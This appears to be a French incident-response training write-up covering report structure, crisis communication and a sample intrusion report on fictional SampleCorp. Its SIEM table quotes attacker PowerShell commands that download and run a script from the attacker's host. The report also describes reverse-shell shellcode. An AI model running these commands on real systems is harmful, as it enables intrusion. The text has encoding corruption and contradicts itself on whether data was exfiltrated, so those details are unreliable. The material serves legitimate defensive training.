* **Liste de contrÃ´le de rÃ©ponse Ã  l'incident**
* **Archives de communication**
* **Documents de conformitÃ© (NDA, formulaires rÃ©glementaires)**
* **Glossaire et acronymes**

### Meilleures Pratiques

* **Analyse des causes profondes** : Identifier la cause fondamentale pour Ã©viter une rÃ©pÃ©tition.
* **Partage communautaire** : Partager des informations non sensibles avec la communautÃ© de la sÃ©curitÃ©.
* **Mises Ã  jour rÃ©guliÃ¨res** : Informer les parties prenantes tout au long de la rÃ©ponse Ã  l'incident.
* **RÃ©vision externe** : Faire appel Ã  des experts tiers pour valider les conclusions.

### Conclusion

Un rapport d'incident est essentiel aprÃ¨s un Ã©vÃ©nement de sÃ©curitÃ©, offrant une analyse approfondie de ce qui a Ã©chouÃ©, des rÃ©ponses efficaces et des stratÃ©gies pour prÃ©venir des Ã©vÃ©nements similaires Ã  l'avenir.

```

## **Communications**

```jsx
### La Communication Efficace en Cas de Crise de SÃ©curitÃ©

La communication efficace est indispensable lors d'une crise, en particulier lors d'un incident de sÃ©curitÃ©. Une communication transparente, coordonnÃ©e et bien structurÃ©e soutient la construction de la confiance, la conformitÃ© rÃ©glementaire et l'efficacitÃ© des efforts de rÃ©ponse.

### L'Importance de la Communication Efficace

La valeur d'une communication claire lors d'un incident peut Ãªtre catÃ©gorisÃ©e en plusieurs domaines clÃ©s :

#### Confiance des Parties Prenantes

La communication transparente favorise la confiance des parties prenantes. En communiquant rapidement et clairement, une organisation dÃ©montre sa responsabilitÃ©, sa transparence et son contrÃ´le sur l'incident.

#### Coordination et EfficacitÃ©

Un incident de cybersÃ©curitÃ© affecte plus que lâ€™Ã©quipe technique ; il a des implications plus larges au sein de l'organisation. Une communication coordonnÃ©e assure l'alignement entre toutes les parties prenantes, amÃ©liorant ainsi la rapiditÃ© et l'efficacitÃ© de la rÃ©ponse.

#### ConformitÃ© RÃ©glementaire

VÃ©rifiez les exigences de conformitÃ© spÃ©cifiques Ã  votre organisation, qui devraient Ãªtre documentÃ©es dans le Plan de RÃ©ponse aux Incidents (PRI). Les directives rÃ©glementaires dictent souvent comment, quand et ce qui doit Ãªtre communiquÃ© pour respecter les exigences lÃ©gales.

### Communication Interne

Les communications internes sont cruciales pour maintenir un message cohÃ©rent et constant au sein de l'organisation. Cela est particuliÃ¨rement important pour Ã©viter les fuites et la dÃ©sinformation. Les Ã©lÃ©ments clÃ©s des communications internes comprennent :

* **Notification ImmÃ©diate** : Informer rapidement toutes les parties prenantes pertinentes dÃ¨s l'identification de l'incident.
* **Mises Ã  Jour RÃ©guliÃ¨res** : Partager des mises Ã  jour rÃ©guliÃ¨res avec les Ã©quipes concernÃ©es, couvrant l'Ã©tat de l'incident, les impacts potentiels et les actions en cours.
* **Boucle de RÃ©troaction** : Ã‰tablir un canal de rÃ©troaction permettant aux Ã©quipes de partager leurs remarques, prÃ©occupations et suggestions.

### Communication Externe

Les communications externes doivent Ãªtre soigneusement planifiÃ©es, car elles concernent souvent divers tiers, allant des clients aux rÃ©gulateurs. Les considÃ©rations importantes incluent :

* **Parties Affected** : Communiquer directement avec les individus ou entitÃ©s affectÃ©s, comme les clients, partenaires ou fournisseurs.
* **DÃ©claration Publique** : En cas d'incidents de grande envergure, envisager de publier une dÃ©claration publique claire et sans jargon technique pour garantir l'accessibilitÃ©.
* **Organismes de RÃ©gulation** : Notifier les entitÃ©s rÃ©glementaires, telles que la CNIL (Commission Nationale de l'Informatique et des LibertÃ©s), si requis par la juridiction ou la loi, dans les dÃ©lais spÃ©cifiÃ©s.

### Naviguer dans les Canaux de Communication lors dâ€™Incidents de CybersÃ©curitÃ©

Une communication efficace lors dâ€™un incident de cybersÃ©curitÃ© nÃ©cessite des canaux sÃ©curisÃ©s et conformes. Voici un aperÃ§u des considÃ©rations techniques et rÃ©glementaires pour ces canaux.

#### Dimensions de SÃ©curitÃ© des Canaux de Communication

* **Chiffrement** : Assurez-vous que toutes les communications sont sÃ©curisÃ©es avec un chiffrement de bout en bout, en particulier lors de discussions de dÃ©tails sensibles.
* **Authentification et Autorisation** : ProtÃ©gez l'accÃ¨s aux canaux de communication avec une authentification multi-facteurs stricte (MFA) pour vÃ©rifier les identitÃ©s.
* **IntÃ©gritÃ© des DonnÃ©es** : Utilisez des hachages cryptographiques pour garantir que les messages restent inchangÃ©s lors de leur transmission.
* **Communications Ã‰phÃ©mÃ¨res** : Pour les discussions trÃ¨s confidentielles, envisagez l'utilisation de plateformes qui suppriment les messages aprÃ¨s leur lecture afin de rÃ©duire les risques de fuites futures.
* **Communications IsolÃ©es (Air-Gapped)** : Si les systÃ¨mes de communication principaux sont compromis, utilisez des systÃ¨mes isolÃ©s qui sont sÃ©parÃ©s des autres rÃ©seaux pour maintenir la sÃ©curitÃ©.

#### Dimensions RÃ©glementaires des Canaux de Communication

* **Lois sur la ConfidentialitÃ© des DonnÃ©es** : AdhÃ©rez aux rÃ©gulations sur la confidentialitÃ© des donnÃ©es, telles que le RGPD (RÃ¨glement GÃ©nÃ©ral sur la Protection des DonnÃ©es), surtout lorsqu'il s'agit de donnÃ©es personnelles, pour assurer la conformitÃ©.
* **Mandats de Notification des Violations** : Suivez les dÃ©lais et les lignes directrices spÃ©cifiques Ã  chaque juridiction concernant la notification des parties prenantes en cas de violation des donnÃ©es.
* **Conservation des Documents** : Trouvez un Ã©quilibre entre la messagerie Ã©phÃ©mÃ¨re et les exigences de conservation des documents, car certaines rÃ©gulations imposent de conserver les communications liÃ©es Ã  l'incident.
* **Communications TransfrontaliÃ¨res** : Soyez conscient des lois sur la souverainetÃ© des donnÃ©es qui peuvent affecter les protocoles de communication et le stockage des donnÃ©es si l'incident concerne plusieurs juridictions.
* **ChaÃ®ne de Custodie** : Maintenez une chaÃ®ne de custodie ininterrompue pour toutes les communications si des procÃ©dures lÃ©gales sont anticipÃ©es, afin de garantir que les preuves restent recevables en justice.

### Conclusion

La communication efficace est un composant critique de la rÃ©ponse aux incidents, reliant la coordination interne et les exigences rÃ©glementaires. En mettant en Å“uvre des stratÃ©gies de communication sÃ©curisÃ©es, bien planifiÃ©es et conformes, les organisations peuvent renforcer leur rÃ©silience et rÃ©pondre plus efficacement aux incidents de sÃ©curitÃ©.

```

## **Real-world Incident Report**

<aside>
ğŸ’¡

**RÃ©sumÃ© ExÃ©cutif**

- **ID de l'incident :** INC2019-0422-022
- **GravitÃ© de l'incident :** Ã‰levÃ©e (P2)
- **Statut de lâ€™incident :** RÃ©solu

**AperÃ§u de l'incident :**

Dans la nuit du 22 avril 2019 Ã  01:05:00, le Centre des OpÃ©rations de SÃ©curitÃ© (SOC) de SampleCorp a dÃ©tectÃ© une activitÃ© non autorisÃ©e sur le rÃ©seau interne. Celle-ci sâ€™est manifestÃ©e par le lancement de processus anormaux et des commandes PowerShell suspectes. Profitant dâ€™un manque de contrÃ´les dâ€™accÃ¨s rÃ©seau robustes et de deux vulnÃ©rabilitÃ©s de sÃ©curitÃ©, un acteur malveillant est parvenu Ã  prendre le contrÃ´le des nÅ“uds suivants de lâ€™infrastructure de SampleCorp :

- **WKST01.samplecorp.com** : systÃ¨me utilisÃ© pour le dÃ©veloppement logiciel.
- **HR01.samplecorp.com** : systÃ¨me dÃ©diÃ© au traitement des donnÃ©es des employÃ©s et partenaires.

Le SOC de SampleCorp, en collaboration avec les Ã©quipes de RÃ©ponse aux Incidents et dâ€™Investigation NumÃ©rique (DFIR), a pu contenir la menace, supprimer les logiciels malveillants et corriger les failles de sÃ©curitÃ©. Les systÃ¨mes compromis ont Ã©tÃ© restaurÃ©s dans leur Ã©tat initial.

**Constats clÃ©s :**

Lâ€™intrus a pu obtenir une adresse IP interne en connectant simplement son ordinateur Ã  un port Ethernet dans un bureau de SampleCorp, en raison de contrÃ´les dâ€™accÃ¨s rÃ©seau insuffisants. Lâ€™enquÃªte a rÃ©vÃ©lÃ© que lâ€™entitÃ© malveillante a initialement compromis **WKST01.samplecorp.com** via une version vulnÃ©rable dâ€™Acrobat Reader, puis a exploitÃ© une vulnÃ©rabilitÃ© de type "buffer overflow" dans une application propriÃ©taire dÃ©veloppÃ©e par SampleCorp pour Ã©tendre son accÃ¨s. Aucune fuite massive de donnÃ©es nâ€™a Ã©tÃ© dÃ©tectÃ©e, probablement grÃ¢ce Ã  lâ€™intervention rapide du SOC et des Ã©quipes DFIR. Toutefois, lâ€™accÃ¨s non autorisÃ© Ã  **WKST01** et **HR01** implique que les donnÃ©es internes et client doivent Ãªtre considÃ©rÃ©es comme potentiellement compromises.

**Actions immÃ©diates :**

Les Ã©quipes SOC et DFIR internes ont gÃ©rÃ© lâ€™incident sans faire appel Ã  des prestataires externes. Les systÃ¨mes compromis ont Ã©tÃ© isolÃ©s par segmentation VLAN. Pour mener une enquÃªte approfondie, un ensemble de donnÃ©es a Ã©tÃ© collectÃ©, incluant des captures du trafic rÃ©seau. Tous les systÃ¨mes affectÃ©s ont Ã©tÃ© raccordÃ©s Ã  une solution de sÃ©curitÃ© hÃ´te, et les journaux dâ€™Ã©vÃ©nements ont Ã©tÃ© collectÃ©s automatiquement via la solution Elastic SIEM existante.

**Impact sur les parties prenantes :**

- **Clients :**
    
    Bien quâ€™aucune exfiltration massive nâ€™ait Ã©tÃ© dÃ©tectÃ©e, lâ€™accÃ¨s non autorisÃ© aux systÃ¨mes susmentionnÃ©s soulÃ¨ve des inquiÃ©tudes quant Ã  lâ€™intÃ©gritÃ© et Ã  la confidentialitÃ© des donnÃ©es clients. Par mesure de prÃ©caution, certains services ont Ã©tÃ© temporairement mis hors ligne et des clÃ©s API ont Ã©tÃ© rÃ©voquÃ©es, entraÃ®nant de courtes pÃ©riodes dâ€™indisponibilitÃ©. Lâ€™impact financier de cette interruption est en cours dâ€™Ã©valuation, avec un risque potentiel de perte de revenus et de confiance client.
    
- **EmployÃ©s :**
    
    Le systÃ¨me **HR01.samplecorp.com**, contenant des donnÃ©es sensibles sur les employÃ©s, a Ã©tÃ© compromis. Bien quâ€™aucune preuve dâ€™une extraction ciblÃ©e des donnÃ©es nâ€™ait Ã©tÃ© trouvÃ©e, le risque demeure. Les employÃ©s pourraient Ãªtre exposÃ©s Ã  des tentatives de vol dâ€™identitÃ© ou de phishing.
    
- **Partenaires commerciaux :**
    
    Lâ€™accÃ¨s Ã  **WKST01.samplecorp.com**, un environnement de dÃ©veloppement, laisse supposer que du code propriÃ©taire ou des technologies confidentielles pourraient avoir Ã©tÃ© exposÃ©s. Cela peut impacter la confiance des partenaires commerciaux dans lâ€™exclusivitÃ© des solutions technologiques de SampleCorp.
    
- **Organismes de rÃ©gulation :**
    
    Cette faille de sÃ©curitÃ© peut entraÃ®ner des consÃ©quences rÃ©glementaires. Selon les juridictions concernÃ©es et la nature des donnÃ©es compromises, des amendes ou sanctions pourraient Ãªtre infligÃ©es Ã  SampleCorp pour manquement Ã  la protection des donnÃ©es sensibles.
    
- **Ã‰quipes internes :**
    
    Bien que les Ã©quipes SOC et DFIR aient efficacement contenu lâ€™incident, celui-ci nÃ©cessitera probablement une rÃ©vision voire une refonte des mesures de sÃ©curitÃ© existantes. Cela pourrait entraÃ®ner une rÃ©allocation des ressources et des ajustements budgÃ©taires, affectant dâ€™autres projets ou dÃ©partements.
    
- **Actionnaires :**
    
    Ã€ court terme, lâ€™incident pourrait affecter nÃ©gativement le cours de lâ€™action en raison dâ€™une possible perte de confiance des clients et de potentielles sanctions. Ã€ long terme, les impacts dÃ©pendront de lâ€™efficacitÃ© des mesures correctives mises en place et de la capacitÃ© de lâ€™entreprise Ã  restaurer la confiance des parties prenantes.
    

**Analyse Technique**

**SystÃ¨mes et DonnÃ©es AffectÃ©s**

En raison dâ€™un manque de contrÃ´les dâ€™accÃ¨s rÃ©seau efficaces, un individu non autorisÃ© a pu obtenir une adresse IP interne simplement en connectant son ordinateur Ã  un port Ethernet dans les locaux de SampleCorp.

Lâ€™entitÃ© malveillante est parvenue Ã  prendre le contrÃ´le des systÃ¨mes suivants au sein de lâ€™infrastructure de SampleCorp :

- **WKST01.samplecorp.com** : Environnement de dÃ©veloppement contenant du code source propriÃ©taire destinÃ© Ã  de futures versions logicielles, ainsi que des clÃ©s API pour des services tiers. Lâ€™analyse des accÃ¨s montre que lâ€™intrus a parcouru plusieurs rÃ©pertoires, ce qui soulÃ¨ve des inquiÃ©tudes quant Ã  un Ã©ventuel vol de propriÃ©tÃ© intellectuelle et Ã  une utilisation abusive des clÃ©s API.
- **HR01.samplecorp.com** : SystÃ¨me de gestion des ressources humaines contenant des donnÃ©es sensibles relatives aux employÃ©s et partenaires : informations personnelles, donnÃ©es de paie et Ã©valuations de performance. Les journaux dâ€™activitÃ© confirment un accÃ¨s non autorisÃ© Ã  ce systÃ¨me. Le point le plus prÃ©occupant est lâ€™accÃ¨s Ã  une base de donnÃ©es non chiffrÃ©e contenant les numÃ©ros de sÃ©curitÃ© sociale et les coordonnÃ©es bancaires des employÃ©s. Bien quâ€™aucune preuve dâ€™exfiltration nâ€™ait Ã©tÃ© dÃ©tectÃ©e, le risque potentiel de vol dâ€™identitÃ© et de fraude financiÃ¨re est jugÃ© Ã©levÃ©.

**Sources et Analyse des Preuves**

**WKST01.samplecorp.com**

Dans la nuit du 22 avril 2019, Ã  01:05:00 prÃ©cises, le Centre des OpÃ©rations de SÃ©curitÃ© (SOC) de SampleCorp a dÃ©tectÃ© une activitÃ© anormale sur le rÃ©seau interne. Cette alerte a Ã©tÃ© dÃ©clenchÃ©e par lâ€™observation de relations inhabituelles entre processus parent-enfant et lâ€™exÃ©cution de commandes PowerShell suspectes, comme illustrÃ© dans une capture dâ€™Ã©cran interne.

Lâ€™analyse des journaux rÃ©vÃ¨le que PowerShell a Ã©tÃ© invoquÃ© via **cmd.exe** pour exÃ©cuter le contenu dâ€™un script hÃ©bergÃ© Ã  distance. Lâ€™adresse IP du serveur distant Ã©tait **192.168.220.66**, une adresse interne, ce qui indique que lâ€™entitÃ© malveillante avait dÃ©jÃ  pÃ©nÃ©trÃ© le rÃ©seau interne avant lâ€™exÃ©cution du script.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%206.png)

Les premiers signes d'exÃ©cution de commandes malveillantes indiquent que **WKST01.samplecorp.com** a probablement Ã©tÃ© compromis suite Ã  l'ouverture d'une piÃ¨ce jointe suspecte dans un e-mail, nommÃ©e **cv.pdf**, et ce pour les raisons suivantes :

- L'utilisateur a accÃ©dÃ© Ã  sa messagerie via le client **Mozilla Thunderbird**.
- Le fichier **cv.pdf**, jugÃ© suspect, a Ã©tÃ© ouvert avec **Adobe Reader 10.0**, une version obsolÃ¨te prÃ©sentant des vulnÃ©rabilitÃ©s connues.
- Des commandes malveillantes ont Ã©tÃ© enregistrÃ©es immÃ©diatement aprÃ¨s ces actions, suggÃ©rant un lien direct avec lâ€™ouverture du fichier.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%207.png)
    
    De plus, cmd.exe et powershell.exe ont Ã©tÃ© gÃ©nÃ©rÃ©s Ã  partir de wmiprvse.exe.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%208.png)
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%209.png)
    
    Comme dÃ©jÃ  mentionnÃ©, lâ€™entitÃ© non autorisÃ©e a ensuite exÃ©cutÃ© des commandes PowerShell spÃ©cifiques.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2010.png)
    
    **Analyse succincte de lâ€™adresse IP 192.168.220.66**
    
    Lâ€™analyse des journaux a permis dâ€™identifier quatre hÃ´tes actifs sur le segment rÃ©seau, chacun associÃ© Ã  une adresse IP et un nom de machine. Lâ€™hÃ´te **192.168.220.66**, prÃ©cÃ©demment repÃ©rÃ© dans les journaux de **WKST01.samplecorp.com**, confirme la prÃ©sence dâ€™un acteur non autorisÃ© au sein du rÃ©seau interne.
    
    | Adresse IP | Nom dâ€™hÃ´te |
    | --- | --- |
    | 192.168.220.20 | DC01.samplecorp.com |
    | 192.168.220.200 | WKST01.samplecorp.com |
    | 192.168.220.101 | HR01.samplecorp.com |
    | 192.168.220.202 | ENG01.samplecorp.com |
    
    Le tableau ci-dessous prÃ©sente les rÃ©sultats dâ€™une requÃªte SIEM visant Ã  identifier les exÃ©cutions de commandes initiÃ©es depuis lâ€™adresse **192.168.220.66**, sur la base des journaux collectÃ©s Ã  partir de **WKST01.samplecorp.com** :
    
    | Commande exÃ©cutÃ©e | HÃ´te cible | Nombre dâ€™occurrences |
    | --- | --- | --- |
    | `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 5 |
    | `cmd.exe /Q /c dir 1> \\127.0.0.1\ADMIN$\__1555864304.02 2>&1` | WKST01 | 4 |
    | `powershell.exe -nop -w hidden -c $c=new-object net.webclient;...;IEX` | WKST01 | 2 |
    | `whoami` | WKST01 | 1 |
    | `powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.220.66/test.php'); $m = Get-ModifiableService;` | HR01 | 1 |
    
    Ces rÃ©sultats indiquent que lâ€™entitÃ© non autorisÃ©e a rÃ©ussi Ã  infiltrer les systÃ¨mes **WKST01.samplecorp.com** et **HR01.samplecorp.com**.
    
    **HR01.samplecorp.com**
    
    Une attention particuliÃ¨re a ensuite Ã©tÃ© portÃ©e Ã  **HR01.samplecorp.com**, car les captures rÃ©seau montrent que lâ€™adresse **192.168.220.66** a tentÃ© dâ€™Ã©tablir une connexion avec ce systÃ¨me dÃ¨s les premiÃ¨res phases de lâ€™activitÃ© malveillante. Cela renforce lâ€™hypothÃ¨se dâ€™une compromission planifiÃ©e et coordonnÃ©e entre plusieurs hÃ´tes internes.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2011.png)
    
    Les dÃ©tails du trafic rÃ©seau indiquent une tentative d'exploitation par dÃ©passement de tampon ciblant le service actif sur le port **31337** de **HR01.samplecorp.com**.
    
    ![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2012.png)
    

Le trafic rÃ©seau a Ã©tÃ© exportÃ© sous forme de binaire brut pour une analyse plus approfondie.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2013.png)

Le binaire extrait a Ã©tÃ© analysÃ© dans un dÃ©bogueur de shellcode, scdbg.

Scdbg rÃ©vÃ¨le que le shellcode tentera d'Ã©tablir une connexion Ã  192.168.220.66 sur le port 4444. Cela confirme une tentative d'exploitation d'un service exÃ©cutÃ© sur le port 31337 de [HR01.samplecorp.com](http://hr01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2014.png)

Une recherche de connexions rÃ©seau entre [HR01.samplecorp.com](http://hr01.samplecorp.com/) et l'entitÃ© non autorisÃ©e a Ã©tÃ© effectuÃ©e Ã  l'aide du fichier de capture de trafic susmentionnÃ©. Les rÃ©sultats ont rÃ©vÃ©lÃ© des connexions vers l'entitÃ© non autorisÃ©e sur le port 4444. Cela indique que l'entitÃ© non autorisÃ©e a exploitÃ© avec succÃ¨s une vulnÃ©rabilitÃ© de dÃ©passement de mÃ©moire tampon pour obtenir l'exÃ©cution de commandes sur [HR01.samplecorp.com](http://hr01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2015.png)

### **Adaptation de la profondeur de lâ€™analyse technique**

La profondeur de lâ€™analyse technique peut Ãªtre ajustÃ©e afin de garantir que lâ€™ensemble des parties prenantes soient correctement informÃ©es de lâ€™incident et des mesures prises en rÃ©ponse. Bien que nous ayons volontairement condensÃ© les dÃ©tails de lâ€™enquÃªte dans ce module afin de ne pas vous submerger, il est important de noter que, dans un contexte rÃ©el, chaque affirmation serait Ã©tayÃ©e par des preuves solides et vÃ©rifiables.

---

### **Indicateurs de Compromission (IoCs)**

- **Adresse IP de Command & Control (C2)** : 192.168.220.66
- **Fichier malveillant** : `cv.pdf`
    - **Empreinte SHA256** : `ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011`

---

### **Analyse des Causes Racines**

L'accÃ¨s non autorisÃ© au rÃ©seau interne de SampleCorp a Ã©tÃ© rendu possible par l'absence de contrÃ´les dâ€™accÃ¨s rÃ©seau adÃ©quats.

Deux vulnÃ©rabilitÃ©s majeures ont Ã©tÃ© identifiÃ©es comme causes principales de lâ€™incident :

1. **Utilisation dâ€™une version obsolÃ¨te dâ€™Adobe Acrobat Reader**, connue pour ses failles de sÃ©curitÃ©.
2. **PrÃ©sence dâ€™une vulnÃ©rabilitÃ© de type dÃ©passement de tampon** dans une application propriÃ©taire.

Ces failles ont Ã©tÃ© aggravÃ©es par un manque de cloisonnement rÃ©seau entre les systÃ¨mes critiques, facilitant la propagation de lâ€™attaque. En parallÃ¨le, lâ€™absence de formation des utilisateurs face aux techniques de phishing a Ã©galement Ã©tÃ© un facteur de compromission.

---

### **Chronologie Technique de lâ€™Incident**

### **Compromission initiale**

- **22 avril 2019, 00:27:27** : Un employÃ© ouvre le fichier malveillant `cv.pdf` sur **WKST01.samplecorp.com**, exploitant une vulnÃ©rabilitÃ© dans une version obsolÃ¨te dâ€™Acrobat Reader. Cela dÃ©clenche lâ€™exÃ©cution dâ€™un code malveillant qui permet une premiÃ¨re prise de contrÃ´le.

### **Mouvement latÃ©ral**

- **22 avril 2019, 00:50:18** : Lâ€™entitÃ© malveillante rÃ©alise une reconnaissance du rÃ©seau interne. Elle identifie une vulnÃ©rabilitÃ© de type buffer overflow dans une application RH propriÃ©taire sur **HR01.samplecorp.com** et lâ€™exploite pour accÃ©der Ã  ce systÃ¨me.

### **AccÃ¨s aux donnÃ©es & exfiltration**

- **22 avril 2019, 00:35:09** : Lâ€™intrus accÃ¨de Ã  plusieurs rÃ©pertoires sur **WKST01** contenant du code source propriÃ©taire et des clÃ©s API.
- **22 avril 2019, 01:30:12** : Il dÃ©couvre une base de donnÃ©es non chiffrÃ©e sur **HR01** contenant des donnÃ©es sensibles (NIR, salaires, etc.), quâ€™il compresse puis exfiltre vers un serveur externe via un tunnel SSH sÃ©curisÃ©.

### **Communications avec le serveur C2**

- Lâ€™entitÃ© malveillante a obtenu un accÃ¨s physique au rÃ©seau interne. Le serveur de commande et de contrÃ´le (C2) identifiÃ© utilisait lâ€™adresse IP interne **192.168.220.66**.

### **DÃ©ploiement ou activitÃ© de logiciels malveillants**

- Le malware a Ã©tÃ© diffusÃ© via un fichier PDF malveillant et a utilisÃ© des binaires Windows lÃ©gitimes pour lâ€™exÃ©cution de commandes et lâ€™exploitation post-compromission.
- Du code shell (shellcode) a ensuite Ã©tÃ© injectÃ© dans le cadre du buffer overflow pour infecter **HR01.samplecorp.com**.

---

### **Phases de Contention**

- **22 avril 2019, 02:30:11** : Les Ã©quipes SOC et DFIR isolent immÃ©diatement les machines **WKST01** et **HR01** via segmentation VLAN.
- **03:10:14** : Installation dâ€™une solution de sÃ©curitÃ© sur les deux hÃ´tes pour collecter davantage de donnÃ©es.
- **03:43:34** : Mise Ã  jour des rÃ¨gles du pare-feu pour bloquer lâ€™IP C2 identifiÃ©e et couper lâ€™accÃ¨s distant de lâ€™attaquant.

---

### **Phases dâ€™Ã‰radication**

- **04:11:00** : Utilisation dâ€™un outil spÃ©cialisÃ© de suppression de malware sur **WKST01** et **HR01**.
- **04:30:00** : Mise Ã  jour dâ€™Acrobat Reader sur toutes les machines concernÃ©es pour corriger la vulnÃ©rabilitÃ© initiale.
- **05:01:08** : RÃ©vocation des clÃ©s API compromises.
- **05:05:08** : RÃ©initialisation des identifiants des utilisateurs concernÃ©s.

---

### **Phases de RÃ©tablissement**

- **05:21:20** : Restauration de **WKST01** Ã  partir dâ€™une sauvegarde validÃ©e.
- **05:58:50** : Restauration de **HR01** suivant la mÃªme procÃ©dure.
- **06:33:44** : DÃ©ploiement dâ€™un correctif dâ€™urgence sur lâ€™application RH pour combler la vulnÃ©rabilitÃ© de type buffer overflow.

---

### **Nature de lâ€™Attaque**

Cette section vise Ã  examiner en dÃ©tail le mode opÃ©ratoire de lâ€™acteur malveillant, en analysant les tactiques, techniques et procÃ©dures (TTPs) utilisÃ©es tout au long de lâ€™intrusion. Par exemple, nous avons Ã©tudiÃ© la maniÃ¨re dont lâ€™Ã©quipe SOC a pu dÃ©terminer que lâ€™entitÃ© non autorisÃ©e avait recours au **framework Metasploit**.

---

### **DÃ©tection de Metasploit**

Pour mieux comprendre les mÃ©thodes employÃ©es, une attention particuliÃ¨re a Ã©tÃ© portÃ©e sur les commandes **PowerShell** malveillantes exÃ©cutÃ©es, notamment celle visible dans la capture dâ€™Ã©cran suivante.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2016.png)

AprÃ¨s inspection, il est apparu clairement qu'un double codage avait Ã©tÃ© utilisÃ©, probablement pour contourner les mÃ©canismes de dÃ©tection. L'Ã©quipe SOC a rÃ©ussi Ã  dÃ©coder la charge utile malveillante, rÃ©vÃ©lant le code PowerShell exact exÃ©cutÃ© dans la mÃ©moire de [WKST01.samplecorp.com](http://wkst01.samplecorp.com/).

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2017.png)

En exploitant les renseignements open source, notre Ã©quipe SOC a dÃ©terminÃ© que ce code PowerShell est probablement liÃ© au framework de post-exploitation Metasploit.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2018.png)

Pour Ã©tayer notre hypothÃ¨se d'utilisation de Metasploit, nous avons analysÃ© en profondeur le shellcode dÃ©tectÃ©. Nous avons exportÃ© les octets du paquet contenant le shellcode (au format .bin) et les avons ensuite soumis Ã  VirusTotal pour Ã©valuation.

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2019.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2020.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%2021.png)

### **Confirmation de lâ€™utilisation de Metasploit**

Les rÃ©sultats fournis par **VirusTotal** ont confirmÃ© nos soupÃ§ons concernant lâ€™usage de **Metasploit**. Les artefacts tels que `metacoder` et `shikata`, dÃ©tectÃ©s dans les charges utiles, sont intrinsÃ¨quement liÃ©s au shellcode gÃ©nÃ©rÃ© par ce framework de post-exploitation.

---

### **Analyse de l'Impact**

Dans cette section, une analyse approfondie des impacts sur les parties prenantes est essentielle, en tenant compte de la structure interne spÃ©cifique de lâ€™entreprise, de son environnement commercial et de ses obligations rÃ©glementaires. Cette Ã©valuation vise Ã  cerner les rÃ©percussions de lâ€™incident sur toutes les entitÃ©s concernÃ©es.

---

### **Analyse de la RÃ©ponse et de la RÃ©cupÃ©ration**

### **Mesures de RÃ©ponse ImmÃ©diate**

**RÃ©vocation des AccÃ¨s :**

- **Identification des systÃ¨mes et comptes compromis :** GrÃ¢ce Ã  la solution SIEM dâ€™Elastic, des activitÃ©s suspectes ont Ã©tÃ© dÃ©tectÃ©es sur **WKST01.samplecorp.com**. Une analyse des journaux et du trafic rÃ©seau a ensuite rÃ©vÃ©lÃ© une compromission de **HR01.samplecorp.com**.
- **PÃ©riode :** Les activitÃ©s malveillantes ont Ã©tÃ© dÃ©tectÃ©es le **22 avril 2019 Ã  01:05:00**. Lâ€™accÃ¨s a Ã©tÃ© rÃ©voquÃ© Ã  **03:43:34**, suite Ã  la mise Ã  jour des rÃ¨gles du pare-feu bloquant lâ€™IP du serveur C2.
- **MÃ©thode de rÃ©vocation :** En complÃ©ment du blocage via pare-feu, des politiques Active Directory ont Ã©tÃ© mises en Å“uvre pour forcer la dÃ©connexion des sessions suspectes. Les identifiants utilisateurs compromis ont Ã©tÃ© rÃ©initialisÃ©s et les clÃ©s API concernÃ©es ont Ã©tÃ© rÃ©voquÃ©es.
- **Impact :** Cette action rapide a permis dâ€™arrÃªter tout mouvement latÃ©ral potentiel et de prÃ©venir une compromission plus Ã©tendue.

### **StratÃ©gie de Confinement**

- **Mesures Ã  court terme :** Une segmentation VLAN a Ã©tÃ© immÃ©diatement appliquÃ©e pour isoler les hÃ´tes compromis (**WKST01** et **HR01**) du reste du rÃ©seau, limitant ainsi la propagation de lâ€™attaque.
- **Mesures Ã  long terme :** Des plans ont Ã©tÃ© Ã©tablis pour renforcer la segmentation rÃ©seau, en cloisonnant les services critiques et en limitant l'accÃ¨s aux seuls Ã©quipements autorisÃ©s.
- **EfficacitÃ© :** La stratÃ©gie a Ã©tÃ© efficace, empÃªchant toute Ã©lÃ©vation de privilÃ¨ge ou mouvement vers d'autres systÃ¨mes.

### **Mesures d'Ã‰radication**

**Suppression du Malware :**

- **Identification :** Des processus suspects ont Ã©tÃ© dÃ©tectÃ©s sur les hÃ´tes infectÃ©s. Lâ€™analyse forensique a rÃ©vÃ©lÃ© la prÃ©sence de composants typiques de Metasploit, confirmÃ©e par VirusTotal.
- **Suppression :** Un outil spÃ©cialisÃ© a Ã©tÃ© utilisÃ© pour Ã©radiquer toutes les charges malveillantes identifiÃ©es sur **WKST01** et **HR01**.
- **VÃ©rification :** Des analyses supplÃ©mentaires, incluant des mÃ©thodes heuristiques, ont Ã©tÃ© menÃ©es pour sâ€™assurer de lâ€™absence de rÃ©sidus malveillants.

**Mise Ã  jour des SystÃ¨mes :**

- **Identification des vulnÃ©rabilitÃ©s :** Deux vulnÃ©rabilitÃ©s ont Ã©tÃ© exploitÃ©es : une faille connue dans une version obsolÃ¨te dâ€™Acrobat Reader et un **buffer overflow** dans une application RH propriÃ©taire.
